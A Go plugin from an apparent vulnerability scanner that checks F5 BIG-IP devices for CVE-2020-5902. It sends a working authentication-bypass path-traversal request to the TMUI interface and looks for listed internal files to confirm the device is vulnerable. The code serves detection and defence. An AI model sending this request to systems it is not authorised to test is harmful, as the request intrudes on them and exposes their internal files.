package plugins

import (
	"DORM/models"
	"io"
	"strings"
)

// 55. F5 BIG-IP TMUI RCE (CVE-2020-5902) - Verified
type F5BigIPPlugin struct{}

func (p *F5BigIPPlugin) Name() string { return "F5 BIG-IP TMUI RCE (CVE-2020-5902)" }

func (p *F5BigIPPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()

	targetPath := "/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/tmui/WEB-INF"
	fullURL := getURL(target, targetPath)

	resp, err := client.Get(fullURL)
	if err == nil {
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)

		if resp.StatusCode == 200 {
			if strings.Contains(bodyString, "web.xml") || strings.Contains(bodyString, "struts-config.xml") {
				return &models.Vulnerability{
					Target:      target,
					Name:        "F5 BIG-IP TMUI RCE (Verified)",
					Severity:    "CRITICAL",
					CVSS:        9.8,
					Description: "Authentication bypass successful. Internal system files listed via TMUI interface.",
					Solution:    "Apply F5 security patches immediately or restrict access to the TMUI utility.",
					Reference:   "CVE-2020-5902",
				}
			}
		}
	}
	return nil
}
